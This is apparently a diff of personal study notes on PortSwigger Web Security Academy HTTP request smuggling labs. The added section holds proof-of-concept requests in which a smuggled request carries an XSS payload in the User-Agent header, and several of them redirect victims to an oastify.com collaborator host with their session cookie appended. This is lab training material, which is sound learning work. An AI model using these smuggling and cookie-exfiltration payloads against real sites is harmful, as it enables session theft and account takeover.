@@ -427,7 +427,74 @@ Content-Length: 5
 x=1
 ```
 
-Lab: Response queue poisoning via H2.TE request smuggling
+
+INIT. PoC:
+```
+GET /post?postId=2 HTTP/2
+Host: 0a27009e04ab960f8287fbb30072003b.web-security-academy.net
+Cookie: session=EHLHuoykgRSERPThcyWjjDlfUfAZYRYX
+User-Agent: a"/><script>document.location='http://jpcr09l2pusdlsamou2shbkdw42vqtei.oastify.com/?Hack='+document.cookie;</script>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: hu-HU,hu;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+
+
+```
+in collaborator it should show "/?Hack=" without the actual session value
+
+a response part when visiting a blog:
+```
+                       <form action="/post/comment" method="POST" enctype="application/x-www-form-urlencoded">
+                            <input required type="hidden" name="csrf" value="dqLBOcG9khs4JN7rBXEmu249pZ2xT5b5">
+                            <input required type="hidden" name="userAgent" value="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0">
+                            <input required type="hidden" name="postId" value="2">
+```
+
+FINAL PoC:
+```
+POST / HTTP/1.1
+Host: 0a27009e04ab960f8287fbb30072003b.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 182
+Transfer-Encoding: chunked
+
+0
+
+GET /post?postId=2 HTTP/1.1
+User-Agent: a"/><script>alert("The kookie is: "+document.cookie)</script>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 5
+
+x=1
+```
+
+with collaborator:
+```
+POST / HTTP/1.1
+Host: 0a27009e04ab960f8287fbb30072003b.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 237
+Transfer-Encoding: chunked
+
+0
+
+GET /post?postId=2 HTTP/1.1
+User-Agent: a"/><script>document.location='http://qkeyvgg9k1nkgz5tj1xzcifkrbx2l19q.oastify.com/?Hack='+document.cookie;</script>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 5
+
+x=1
+```
+
+
+## Response queue poisoning via H2.TE request smuggling
 
 poc payload:
 
@@ -486,7 +553,8 @@ Host: YOUR-LAB-ID.web-security-academy.net
 
     In the response, find the URL for deleting carlos (/admin/delete?username=carlos), then update the path in your request accordingly. Send the request to delete carlos and solve the lab.
 
-Lab: H2.CL request smuggling
+
+## H2.CL request smuggling
 
 
 
@@ -535,7 +603,7 @@ Lab: H2.CL request smuggling
 
     Once you have confirmed that you can cause the victim to be redirected to the exploit server, repeat the attack until the lab solves. This may take several attempts because you need to time your attack so that it poisons the connection immediately before the victim's browser attempts to import a JavaScript resource. Otherwise, although their browser will load your malicious JavaScript, it won't execute it.
 
-Lab: HTTP/2 request smuggling via CRLF injection
+## HTTP/2 request smuggling via CRLF injection
 
 
 
@@ -579,7 +647,7 @@ Lab: HTTP/2 request smuggling via CRLF injection
 
     In Burp Repeater, send a request for the home page using the stolen session cookie to solve the lab.
 
-Lab: HTTP/2 request splitting via CRLF injection
+## HTTP/2 request splitting via CRLF injection
 
 https://www.youtube.com/watch?v=W3BGHKyf8RY
 
@@ -627,7 +695,7 @@ search=x
 
     In the response, find the URL for deleting carlos (/admin/delete?username=carlos), then update the path in your request accordingly. Send the request to delete carlos to solve the lab.
 
-Lab: CL.0 request smuggling
+## CL.0 request smuggling
 
 
 
